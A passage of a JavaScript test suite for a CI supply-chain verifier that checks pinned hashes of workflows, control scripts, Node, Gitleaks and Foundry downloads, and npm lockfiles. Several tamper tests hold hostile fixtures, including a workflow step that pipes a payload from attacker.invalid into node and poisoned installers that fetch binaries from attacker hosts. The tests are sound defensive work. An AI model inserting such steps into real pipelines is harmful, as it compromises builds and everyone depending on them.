    [FORK_PIN_VERIFIER_IMPORT_PATH, { mode: '100644', type: 'blob', blobId: '6'.repeat(40), sha256: candidatePins.controlScripts.forkPinVerifier.closure[1].sha256, bytes: Buffer.from(FORK_PIN_VERIFIER_IMPORT_SCRIPT) }],
    ['scripts/verify-control-dependencies.mjs', { mode: '100644', type: 'blob', blobId: '7'.repeat(40), sha256: candidatePins.controlScripts.controlDependencyVerifier.closure[0].sha256, bytes: Buffer.from(CONTROL_DEPENDENCY_VERIFIER_SCRIPT) }],
    [CONTROL_DEPENDENCY_VERIFIER_IMPORT_PATH, { mode: '100644', type: 'blob', blobId: '8'.repeat(40), sha256: candidatePins.controlScripts.controlDependencyVerifier.closure[1].sha256, bytes: Buffer.from(CONTROL_DEPENDENCY_VERIFIER_IMPORT_SCRIPT) }],
    [ARCHIVE_FORK_PROOF_TEST_PATH, { mode: '100644', type: 'blob', blobId: '9'.repeat(40), sha256: candidatePins.contentAddresses.archiveForkProofTest.sha256 }],
  ]);
  const result = verifyBaseControlSurface({
    basePins,
    candidatePins,
    basePinsSha256: sha256(JSON.stringify(basePins)),
    candidatePinsSha256: sha256(JSON.stringify(candidatePins)),
    baseTree: 'a'.repeat(40),
    candidateTree: 'b'.repeat(40),
    baseCheckerBlob: 'c'.repeat(40),
    candidateBlobs,
    candidateVerification: {},
  });

  assert.equal(result.result, 'FAILED');
  assert.match(
    result.errors.join('\n'),
    /candidate fork-pin verifier import closure imports an undeclared local module scripts\/fork-pin-extra\.mjs/,
  );
});

test('the base control checker permits an owner-approved verifier pin bump with an unchanged closure', () => {
  const verifyBaseControlSurface = controlDependencies.verifyBaseControlSurface;
  const basePins = readJson(join(REPO_ROOT, 'product', 'dependency-pins.json'));
  const candidatePins = structuredClone(basePins);
  const candidateVerifier = `${FORK_PIN_VERIFIER_SCRIPT}\nexport const ownerApprovedVerifierRefresh = true;\n`;
  candidatePins.controlScripts.forkPinVerifier.sha256 = sha256(candidateVerifier);
  candidatePins.controlScripts.forkPinVerifier.closure[0].sha256 = sha256(candidateVerifier);
  const basePinsSha256 = sha256(JSON.stringify(basePins));
  const candidatePinsSha256 = sha256(JSON.stringify(candidatePins));
  const baseTree = 'a'.repeat(40);
  const candidateTree = 'b'.repeat(40);
  const baseCheckerBlob = 'c'.repeat(40);

  const candidateBlobs = new Map([
    ['.github/workflows/v4-gates.yml', { mode: '100644', type: 'blob', blobId: '1'.repeat(40), sha256: candidatePins.contentAddresses.workflow.sha256 }],
    ['.github/workflows/fork-proof.yml', { mode: '100644', type: 'blob', blobId: 'a'.repeat(40), sha256: candidatePins.contentAddresses.forkProof.sha256 }],
    ['.github/workflows/fork-pin-canary.yml', { mode: '100644', type: 'blob', blobId: '2'.repeat(40), sha256: candidatePins.contentAddresses.forkPinCanary.sha256 }],
    ['.github/workflows/identity-gate.yml', { mode: '100644', type: 'blob', blobId: '3'.repeat(40), sha256: candidatePins.contentAddresses.identityGate.sha256 }],
    ['.github/workflows/control-gate.yml', { mode: '100644', type: 'blob', blobId: '4'.repeat(40), sha256: candidatePins.contentAddresses.controlGate.sha256 }],
    ['scripts/verify-fork-pin.mjs', { mode: '100644', type: 'blob', blobId: '5'.repeat(40), sha256: candidatePins.controlScripts.forkPinVerifier.closure[0].sha256, bytes: Buffer.from(candidateVerifier) }],
    [FORK_PIN_VERIFIER_IMPORT_PATH, { mode: '100644', type: 'blob', blobId: '6'.repeat(40), sha256: candidatePins.controlScripts.forkPinVerifier.closure[1].sha256, bytes: Buffer.from(FORK_PIN_VERIFIER_IMPORT_SCRIPT) }],
    ['scripts/verify-control-dependencies.mjs', { mode: '100644', type: 'blob', blobId: '7'.repeat(40), sha256: candidatePins.controlScripts.controlDependencyVerifier.closure[0].sha256, bytes: Buffer.from(CONTROL_DEPENDENCY_VERIFIER_SCRIPT) }],
    [CONTROL_DEPENDENCY_VERIFIER_IMPORT_PATH, { mode: '100644', type: 'blob', blobId: '8'.repeat(40), sha256: candidatePins.controlScripts.controlDependencyVerifier.closure[1].sha256, bytes: Buffer.from(CONTROL_DEPENDENCY_VERIFIER_IMPORT_SCRIPT) }],
    [ARCHIVE_FORK_PROOF_TEST_PATH, { mode: '100644', type: 'blob', blobId: '9'.repeat(40), sha256: candidatePins.contentAddresses.archiveForkProofTest.sha256 }],
  ]);
  const result = verifyBaseControlSurface({
    basePins,
    candidatePins,
    basePinsSha256,
    candidatePinsSha256,
    baseTree,
    candidateTree,
    baseCheckerBlob,
    candidateBlobs,
    candidateVerification: {
      controlGatePinBump: {
        schema: 'hookemon.control-gate-pin-bump.v1',
        approvalToken: 'OWNER APPROVED',
        baseTree,
        candidateTree,
        basePinsSha256,
        candidatePinsSha256,
        baseChecker: { path: 'scripts/verify-control-dependencies.mjs', blobId: baseCheckerBlob },
        controls: [{
          path: 'scripts/verify-fork-pin.mjs',
          previousSha256: basePins.controlScripts.forkPinVerifier.closure[0].sha256,
          sha256: candidatePins.controlScripts.forkPinVerifier.closure[0].sha256,
        }],
      },
    },
  });

  assert.equal(result.result, 'PASSED', result.errors.join('\n'));
});

test('rejects a symlinked fork-pin verifier entry before it can execute', () => {
  const state = fixture();
  const verifierPath = join(state.root, 'scripts', 'verify-fork-pin.mjs');
  writeFileSync(join(state.root, 'scripts', 'fork-pin-target.mjs'), FORK_PIN_VERIFIER_SCRIPT);
  unlinkSync(verifierPath);
  symlinkSync('fork-pin-target.mjs', verifierPath);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /fork-pin verifier import closure.*regular repository file/i);
});

test('the base control checker rejects a candidate mutation of its utility import', () => {
  const verifyBaseControlSurface = controlDependencies.verifyBaseControlSurface;
  const basePins = readJson(join(REPO_ROOT, 'product', 'dependency-pins.json'));
  const candidatePins = structuredClone(basePins);
  const utility = candidatePins.controlScripts?.controlDependencyVerifier?.closure?.find(
    entry => entry.path === 'scripts/lib/util.mjs',
  );
  assert.ok(utility, 'control dependency verifier must pin its utility import');

  const result = verifyBaseControlSurface({
    basePins,
    candidatePins,
    basePinsSha256: sha256('same-pins'),
    candidatePinsSha256: sha256('same-pins'),
    baseTree: 'a'.repeat(40),
    candidateTree: 'b'.repeat(40),
    baseCheckerBlob: 'c'.repeat(40),
    candidateBlobs: new Map([[
      utility.path,
      {
        mode: '100644',
        type: 'blob',
        blobId: 'd'.repeat(40),
        sha256: sha256('candidate-mutated-control-utility'),
        bytes: Buffer.from('export const candidateControlUtilityMutation = true;\n'),
      },
    ]]),
    candidateVerification: {},
  });

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /candidate control input scripts\/lib\/util\.mjs digest does not match its candidate pin/);
});

test('the base control checker rejects a coordinated candidate control-surface mutation', () => {
  const verifyBaseControlSurface = controlDependencies.verifyBaseControlSurface;
  assert.equal(typeof verifyBaseControlSurface, 'function', 'the protected workflow needs an exported base control checker');

  const basePins = readJson(join(REPO_ROOT, 'product', 'dependency-pins.json'));
  const candidatePins = structuredClone(basePins);
  candidatePins.contentAddresses.workflow.sha256 = sha256('candidate-v4-gates');
  candidatePins.contentAddresses.controlGate.sha256 = sha256('candidate-control-gate');
  candidatePins.controlScripts.forkPinVerifier.sha256 = sha256('candidate-fork-verifier');
  candidatePins.controlScripts.forkPinVerifier.closure[0].sha256 = candidatePins.controlScripts.forkPinVerifier.sha256;
  candidatePins.controlScripts.forkPinVerifier.closure[1].sha256 = sha256('candidate-keccak');
  candidatePins.controlScripts.controlDependencyVerifier.sha256 = sha256('candidate-control-verifier');
  candidatePins.controlScripts.controlDependencyVerifier.closure[0].sha256 = candidatePins.controlScripts.controlDependencyVerifier.sha256;
  candidatePins.controlScripts.controlDependencyVerifier.closure[1].sha256 = sha256('candidate-control-utility');
  candidatePins.contentAddresses.archiveForkProofTest.sha256 = sha256('candidate-archive-test');

  const candidateBlobs = new Map([
    ['.github/workflows/v4-gates.yml', { mode: '100644', type: 'blob', blobId: '1'.repeat(40), sha256: candidatePins.contentAddresses.workflow.sha256 }],
    ['.github/workflows/fork-proof.yml', { mode: '100644', type: 'blob', blobId: 'a'.repeat(40), sha256: candidatePins.contentAddresses.forkProof.sha256 }],
    ['.github/workflows/fork-pin-canary.yml', { mode: '100644', type: 'blob', blobId: '2'.repeat(40), sha256: candidatePins.contentAddresses.forkPinCanary.sha256 }],
    ['.github/workflows/identity-gate.yml', { mode: '100644', type: 'blob', blobId: '3'.repeat(40), sha256: candidatePins.contentAddresses.identityGate.sha256 }],
    ['.github/workflows/control-gate.yml', { mode: '100644', type: 'blob', blobId: '4'.repeat(40), sha256: candidatePins.contentAddresses.controlGate.sha256 }],
    ['scripts/verify-fork-pin.mjs', { mode: '100644', type: 'blob', blobId: '5'.repeat(40), sha256: candidatePins.controlScripts.forkPinVerifier.closure[0].sha256 }],
    [FORK_PIN_VERIFIER_IMPORT_PATH, { mode: '100644', type: 'blob', blobId: '6'.repeat(40), sha256: candidatePins.controlScripts.forkPinVerifier.closure[1].sha256 }],
    ['scripts/verify-control-dependencies.mjs', { mode: '100644', type: 'blob', blobId: '7'.repeat(40), sha256: candidatePins.controlScripts.controlDependencyVerifier.sha256 }],
    [CONTROL_DEPENDENCY_VERIFIER_IMPORT_PATH, { mode: '100644', type: 'blob', blobId: '8'.repeat(40), sha256: candidatePins.controlScripts.controlDependencyVerifier.closure[1].sha256 }],
    ['packages/contracts/test/integration/RobinhoodV4ArchiveFork.t.sol', { mode: '100644', type: 'blob', blobId: '9'.repeat(40), sha256: candidatePins.contentAddresses.archiveForkProofTest.sha256 }],
  ]);
  const result = verifyBaseControlSurface({
    basePins,
    candidatePins,
    basePinsSha256: sha256(JSON.stringify(basePins)),
    candidatePinsSha256: sha256(JSON.stringify(candidatePins)),
    baseTree: 'a'.repeat(40),
    candidateTree: 'b'.repeat(40),
    baseCheckerBlob: 'c'.repeat(40),
    candidateBlobs,
    candidateVerification: {},
  });

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /candidate control pins differ from the protected base/i);
  assert.ok(result.changes.some(change => change.path === CONTROL_DEPENDENCY_VERIFIER_IMPORT_PATH));
});

test('rejects a simultaneous fork-pin-canary workflow and candidate pin mutation', () => {
  const state = fixture();
  const mutatedCanary = `${CANONICAL_FORK_PIN_CANARY}\n# candidate mutation\n`;
  writeFileSync(join(state.root, '.github', 'workflows', 'fork-pin-canary.yml'), mutatedCanary);
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.contentAddresses.forkPinCanary.sha256 = sha256(mutatedCanary);
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /fork-pin canary (?:digest must match the supported release|content mismatch)/);
});

test('rejects Phase 2 runner coverage that omits the operator suite', () => {
  const state = fixture();
  const workflowPath = join(state.root, '.github', 'workflows', 'v4-gates.yml');
  writeFileSync(workflowPath, CANONICAL_WORKFLOW.replace(
    PHASE2_RUNNER_COMMAND,
    'node --test packages/runner/test/cycle/*.test.mjs packages/runner/test/distribution/*.test.mjs',
  ));

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /Verify local Phase 2 runner workflow gate must match the canonical local-only command block/);
});

test('rejects Phase 2 contract coverage narrowed below the complete Forge suite', () => {
  const state = fixture();
  const workflowPath = join(state.root, '.github', 'workflows', 'v4-gates.yml');
  writeFileSync(workflowPath, CANONICAL_WORKFLOW.replace(
    PHASE2_FULL_FORGE_COMMAND,
    'FOUNDRY_LIBS=\'["lib/v4-core"]\' forge test --root packages/contracts --match-path \'test/process/*.t.sol\' -vvv',
  ));

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /Verify local Phase 2 contracts workflow gate must match the canonical local-only command block/);
});

test('rejects adapters coverage that skips the install step', () => {
  const state = fixture();
  const workflowPath = join(state.root, '.github', 'workflows', 'v4-gates.yml');
  writeFileSync(workflowPath, CANONICAL_WORKFLOW.replace(
    `cd packages/adapters\n          npm ci --ignore-scripts\n          cd - >/dev/null\n          ${ADAPTERS_TEST_COMMAND}`,
    `cd packages/adapters\n          ${ADAPTERS_TEST_COMMAND}`,
  ));

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /Verify adapters dependencies workflow gate must match the canonical local-only command block/);
});

test('rejects adapters coverage that swaps to an installed npm install', () => {
  const state = fixture();
  const workflowPath = join(state.root, '.github', 'workflows', 'v4-gates.yml');
  writeFileSync(workflowPath, CANONICAL_WORKFLOW.replace('npm ci --ignore-scripts', 'npm install'));

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /Verify adapters dependencies workflow gate must match the canonical local-only command block/);
});

test('verifies the pinned adapters dependency set and lockfile integrity fields', () => {
  const state = fixture();
  const result = verifyFixture(state);

  assert.equal(result.result, 'PASSED', result.errors.join('\n'));
  assert.deepEqual(result.npmDependencies.adapters, {
    packagePath: 'packages/adapters/package.json',
    lockfilePath: 'packages/adapters/package-lock.json',
    dependencies: ADAPTERS_DEPENDENCIES,
    lockfileVersion: 3,
    resolvedEntryCount: Object.keys(ADAPTERS_DEPENDENCIES).length,
  });
});

test('rejects an adapters lockfile that is not lockfileVersion 3', () => {
  const state = fixture();
  const lockfilePath = join(state.root, 'packages', 'adapters', 'package-lock.json');
  const lockfile = readJson(lockfilePath);
  lockfile.lockfileVersion = 2;
  writeJson(lockfilePath, lockfile);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /adapters package-lock\.json must be lockfileVersion 3/);
});

test('rejects an adapters lockfile entry missing an integrity field', () => {
  const state = fixture();
  const lockfilePath = join(state.root, 'packages', 'adapters', 'package-lock.json');
  const lockfile = readJson(lockfilePath);
  delete lockfile.packages['node_modules/viem'].integrity;
  writeJson(lockfilePath, lockfile);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /adapters package-lock\.json entry node_modules\/viem is missing an integrity field/);
});

test('rejects an adapters lockfile whose direct dependency set drifts from the pinned set', () => {
  const state = fixture();
  const lockfilePath = join(state.root, 'packages', 'adapters', 'package-lock.json');
  const lockfile = readJson(lockfilePath);
  lockfile.packages[''].dependencies = { viem: '2.56.3' };
  writeJson(lockfilePath, lockfile);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /adapters package-lock\.json direct dependency set does not match the pinned set/);
});

test('rejects an adapters lockfile whose pinned version drifts', () => {
  const state = fixture();
  const lockfilePath = join(state.root, 'packages', 'adapters', 'package-lock.json');
  const lockfile = readJson(lockfilePath);
  lockfile.packages[''].dependencies.viem = '2.0.0';
  writeJson(lockfilePath, lockfile);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /adapters package-lock\.json viem version must match the pinned version 2\.56\.3/);
});

test('rejects an adapters package.json whose dependency set drifts from the pinned set', () => {
  const state = fixture();
  const packageJsonPath = join(state.root, 'packages', 'adapters', 'package.json');
  const packageJson = readJson(packageJsonPath);
  packageJson.dependencies['left-pad'] = '1.0.0';
  writeJson(packageJsonPath, packageJson);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /adapters package\.json dependency set does not match the pinned set/);
});

test('rejects an adapters package.json that is not private', () => {
  const state = fixture();
  const packageJsonPath = join(state.root, 'packages', 'adapters', 'package.json');
  const packageJson = readJson(packageJsonPath);
  packageJson.private = false;
  writeJson(packageJsonPath, packageJson);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /adapters package\.json must be private/);
});

test('rejects a dependency-pins.json npmDependencies section that names the wrong paths', () => {
  const state = fixture();
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.npmDependencies.adapters.lockfilePath = 'packages/adapters/lock.json';
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /adapters lockfile path must be packages\/adapters\/package-lock\.json/);
});

test('rejects Phase 2 contract coverage that omits ABI verification', () => {
  const state = fixture();
  const workflowPath = join(state.root, '.github', 'workflows', 'v4-gates.yml');
  writeFileSync(workflowPath, CANONICAL_WORKFLOW.replace(`${PHASE2_ABI_COMMAND}\n`, ''));

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /Verify local Phase 2 contracts workflow gate must match the canonical local-only command block/);
});

assertWorkflowTamperIsRejected('rejects an additional download and interpreter run step', workflow => `${workflow}\n      - name: Download and execute attacker payload\n        run: curl https://attacker.invalid/payload | node\n`);

assertWorkflowTamperIsRejected('rejects a disabled critical verification step', workflow => workflow.replace(
  '      - name: Verify control dependency pins\n        run: node scripts/verify-control-dependencies.mjs',
  '      - name: Verify control dependency pins\n        if: false\n        run: node scripts/verify-control-dependencies.mjs',
));

assertWorkflowTamperIsRejected('rejects a non-fatal critical verification step', workflow => workflow.replace(
  '      - name: Verify control dependency pins\n        run: node scripts/verify-control-dependencies.mjs',
  '      - name: Verify control dependency pins\n        continue-on-error: true\n        run: node scripts/verify-control-dependencies.mjs',
));

assertWorkflowTamperIsRejected('rejects removing a required workflow step', workflow => workflow.replace(
  '      - run: node scripts/check-cleanroom.mjs .\n',
  '',
));

assertWorkflowTamperIsRejected('rejects reordering required workflow steps', workflow => workflow.replace(
  '      - run: node scripts/v4.mjs trace check\n      - run: node scripts/check-cleanroom.mjs .',
  '      - run: node scripts/check-cleanroom.mjs .\n      - run: node scripts/v4.mjs trace check',
));

assertWorkflowTamperIsRejected('rejects replacing a required workflow step', workflow => workflow.replace(
  '      - run: node scripts/check-cleanroom.mjs .',
  '      - run: true',
));

assertWorkflowTamperIsRejected('rejects an unknown additional step', workflow => `${workflow}\n      - name: Unknown step\n        run: true\n`);

test('rejects a Darwin Node example URL even with correctly shaped digests', () => {
  const state = fixture();
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.controlRuntime.distributions['darwin-arm64'].url = 'https://nodejs.example/node-darwin.tar.gz';
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /Node distribution darwin-arm64 URL must match the supported release/);
});

test('rejects an unknown additional Node distribution', () => {
  const state = fixture();
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.controlRuntime.distributions['linux-arm64'] = {
    url: 'https://nodejs.org/download/release/v24.19.0/node-v24.19.0-linux-arm64.tar.xz',
    archiveSha256: 'a'.repeat(64),
    executableSha256: 'b'.repeat(64),
  };
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /Node distributions must contain only linux-x64, darwin-arm64/);
});

test('rejects an unsupported Gitleaks version and release URL', () => {
  const state = fixture();
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.securityTools.gitleaks.version = '8.31.0';
  pins.securityTools.gitleaks.distributions['linux-x64'].url = 'http://example.invalid/gitleaks.tar.gz';
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /Gitleaks version mismatch.*8\.30\.1.*8\.31\.0/);
  assert.match(result.errors.join('\n'), /Gitleaks URL must be the supported HTTPS release/);
});

test('rejects malformed Gitleaks archive and executable digests', () => {
  const state = fixture();
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.securityTools.gitleaks.distributions['linux-x64'].archiveSha256 = 'not-a-sha';
  pins.securityTools.gitleaks.distributions['linux-x64'].executableSha256 = 'also-not-a-sha';
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /Gitleaks archive digest must be a SHA-256/);
  assert.match(result.errors.join('\n'), /Gitleaks executable digest must be a SHA-256/);
});

test('rejects Foundry release metadata outside the supported distribution', () => {
  const state = fixture();
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.phase1Toolchain.foundry.version = '1.7.2';
  pins.phase1Toolchain.foundry.commit = OTHER_SHA;
  pins.phase1Toolchain.foundry.distributions['linux-amd64'] = {
    url: 'https://attacker.invalid/foundry.tar.gz',
    archiveSha256: 'a'.repeat(64),
    executableSha256: 'b'.repeat(64),
  };
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /Foundry version mismatch/);
  assert.match(result.errors.join('\n'), /Foundry commit must match the supported release/);
  assert.match(result.errors.join('\n'), /Foundry distribution URL must match the supported release/);
  assert.match(result.errors.join('\n'), /Foundry distribution archive digest must match the supported release/);
  assert.match(result.errors.join('\n'), /Foundry distribution executable digest must match the supported release/);
});

test('rejects any Gitleaks exception beyond the byte-exact approved policy', () => {
  const state = fixture();
  const config = `${GITLEAKS_CONFIG}\n[[allowlists]]\npaths = ["hidden\\\\.txt"]\n`;
  writeFileSync(join(state.root, '.gitleaks.toml'), config);
  const pinsPath = join(state.root, 'product', 'dependency-pins.json');
  const pins = readJson(pinsPath);
  pins.securityTools.gitleaks.config.sha256 = sha256(config);
  writeJson(pinsPath, pins);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /Gitleaks config must match the supported fail-closed policy/);
});

test('rejects Gitleaks workflow constants that drift from the verified manifest', () => {
  const state = fixture();
  const workflowPath = join(state.root, '.github', 'workflows', 'v4-gates.yml');
  const text = [
    'steps:',
    `  - uses: actions/checkout@${CHECKOUT_SHA}`,
    '  - run: |',
    `      gitleaks_version='${GITLEAKS_VERSION}'`,
    `      gitleaks_url='${GITLEAKS_URL}'`,
    `      gitleaks_archive_sha256='${OTHER_SHA}'`,
    `      gitleaks_executable_sha256='${GITLEAKS_EXECUTABLE_SHA256}'`,
    `      gitleaks_config_sha256='${GITLEAKS_CONFIG_SHA256}'`,
    '',
  ].join('\n');
  writeFileSync(workflowPath, text);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /Gitleaks workflow archive digest mismatch/);
});

test('fails closed when the runtime executable digest does not match', () => {
  const state = fixture();
  writeFileSync(state.runtimeExecutablePath, 'tampered node executable\n');

  const result = verifyFixture(state, { hashRuntimeExecutable: hashFile });

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /Node executable digest mismatch/);
});

test('rejects attacker Node install constants even when official values remain in comments', () => {
  const state = fixture();
  const attackerArchive = 'a'.repeat(64);
  const attackerExecutable = 'b'.repeat(64);
  writeFileSync(
    join(state.root, '.github', 'workflows', 'v4-gates.yml'),
    [
      'steps:',
      `  - uses: actions/checkout@${CHECKOUT_SHA}`,
      '  - run: |',
      `      # node_version='${NODE_VERSION}'`,
      `      # node_url='${NODE_LINUX_URL}'`,
      `      # node_archive_sha256='${NODE_LINUX_ARCHIVE_SHA256}'`,
      `      # node_executable_sha256='${NODE_LINUX_EXECUTABLE_SHA256}'`,
      "      node_version='99.0.0'",
      "      node_url='https://attacker.invalid/node.tar.xz'",
      `      node_archive_sha256='${attackerArchive}'`,
      `      node_executable_sha256='${attackerExecutable}'`,
      `      gitleaks_version='${GITLEAKS_VERSION}'`,
      `      gitleaks_url='${GITLEAKS_URL}'`,
      `      gitleaks_archive_sha256='${GITLEAKS_ARCHIVE_SHA256}'`,
      `      gitleaks_executable_sha256='${GITLEAKS_EXECUTABLE_SHA256}'`,
      `      gitleaks_config_sha256='${GITLEAKS_CONFIG_SHA256}'`,
      '',
    ].join('\n'),
  );

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /Node workflow version mismatch/);
  assert.match(result.errors.join('\n'), /Node workflow URL mismatch/);
  assert.match(result.errors.join('\n'), /Node workflow archive digest mismatch/);
  assert.match(result.errors.join('\n'), /Node workflow executable digest mismatch/);
});

test('rejects inert Node pins when installer commands use attacker variables', () => {
  const state = fixture();
  const workflowPath = join(state.root, '.github', 'workflows', 'v4-gates.yml');
  const canonicalAnchor = `          node_executable_sha256='${NODE_LINUX_EXECUTABLE_SHA256}'`;
  const attackerVariables = [
    canonicalAnchor,
    "          actual_node_url='https://attacker.invalid/node.tar.xz'",
    "          actual_node_archive_sha256='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'",
    "          actual_node_executable_sha256='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'",
    '          actual_node_archive="${RUNNER_TEMP}/attacker-node.tar.xz"',
    '          actual_node_root="${RUNNER_TEMP}/attacker-node"',
    '          actual_node_executable="${actual_node_root}/bin/node"',
  ].join('\n');
  const poisoned = CANONICAL_WORKFLOW
    .replace(canonicalAnchor, attackerVariables)
    .replace('--output "$node_archive" "$node_url"', '--output "$actual_node_archive" "$actual_node_url"')
    .replace('"$node_archive_sha256" "$node_archive"', '"$actual_node_archive_sha256" "$actual_node_archive"')
    .replace('tar -xJf "$node_archive" -C "$RUNNER_TEMP"', 'tar -xJf "$actual_node_archive" -C "$actual_node_root"')
    .replace('"$node_executable_sha256" "$node_executable"', '"$actual_node_executable_sha256" "$actual_node_executable"')
    .replace('echo "${node_root}/bin" >> "$GITHUB_PATH"', 'echo "${actual_node_root}/bin" >> "$GITHUB_PATH"')
    .replace('[[ "$("$node_executable" --version)" == "v${node_version}" ]]', '[[ "$("$actual_node_executable" --version)" == "v99.0.0" ]]');
  assert.notEqual(poisoned, CANONICAL_WORKFLOW);
  assert.match(poisoned, /--output "\$actual_node_archive" "\$actual_node_url"/);
  assert.match(poisoned, /"\$actual_node_archive_sha256" "\$actual_node_archive"/);
  assert.match(poisoned, /"\$actual_node_executable_sha256" "\$actual_node_executable"/);
  writeFileSync(workflowPath, poisoned);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /Node install block must match the canonical verified data flow/);
});

test('rejects inert Gitleaks pins when installer commands use attacker variables', () => {
  const state = fixture();
  const workflowPath = join(state.root, '.github', 'workflows', 'v4-gates.yml');
  const canonicalAnchor = `          gitleaks_config_sha256='${GITLEAKS_CONFIG_SHA256}'`;
  const attackerVariables = [
    canonicalAnchor,
    "          actual_gitleaks_version='99.0.0'",
    "          actual_gitleaks_url='https://attacker.invalid/gitleaks.tar.gz'",
    "          actual_gitleaks_archive_sha256='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'",
    "          actual_gitleaks_executable_sha256='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'",
    "          actual_gitleaks_config_sha256='cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc'",
    '          actual_gitleaks_archive="${RUNNER_TEMP}/attacker-gitleaks.tar.gz"',
    '          actual_gitleaks_root="${RUNNER_TEMP}/attacker-gitleaks"',
    '          actual_gitleaks_executable="${actual_gitleaks_root}/gitleaks"',
  ].join('\n');
  const poisoned = CANONICAL_WORKFLOW
    .replace(canonicalAnchor, attackerVariables)
    .replace('--output "$gitleaks_archive" "$gitleaks_url"', '--output "$actual_gitleaks_archive" "$actual_gitleaks_url"')
    .replace('"$gitleaks_archive_sha256" "$gitleaks_archive"', '"$actual_gitleaks_archive_sha256" "$actual_gitleaks_archive"')
    .replace('mkdir -p "$gitleaks_root"', 'mkdir -p "$actual_gitleaks_root"')
    .replace('tar -xzf "$gitleaks_archive" -C "$gitleaks_root"', 'tar -xzf "$actual_gitleaks_archive" -C "$actual_gitleaks_root"')
    .replace('"$gitleaks_executable_sha256" "$gitleaks_executable"', '"$actual_gitleaks_executable_sha256" "$actual_gitleaks_executable"')
    .replace('"$gitleaks_config_sha256" \'.gitleaks.toml\'', '"$actual_gitleaks_config_sha256" \'.gitleaks.toml\'')
    .replace('echo "$gitleaks_root" >> "$GITHUB_PATH"', 'echo "$actual_gitleaks_root" >> "$GITHUB_PATH"')
    .replace('[[ "$("$gitleaks_executable" version)" == "$gitleaks_version" ]]', '[[ "$("$actual_gitleaks_executable" version)" == "$actual_gitleaks_version" ]]');
  assert.notEqual(poisoned, CANONICAL_WORKFLOW);
  assert.match(poisoned, /--output "\$actual_gitleaks_archive" "\$actual_gitleaks_url"/);
  assert.match(poisoned, /"\$actual_gitleaks_archive_sha256" "\$actual_gitleaks_archive"/);
  assert.match(poisoned, /"\$actual_gitleaks_executable_sha256" "\$actual_gitleaks_executable"/);
  assert.match(poisoned, /"\$actual_gitleaks_config_sha256" '\.gitleaks\.toml'/);
  writeFileSync(workflowPath, poisoned);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /Gitleaks install block must match the canonical verified data flow/);
});

test('fails closed when no exact platform and architecture distribution is pinned', () => {
  const state = fixture();

  const result = verifyFixture(state, { platform: 'linux', arch: 'arm64' });

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /Node distribution missing.*linux-arm64/);
});

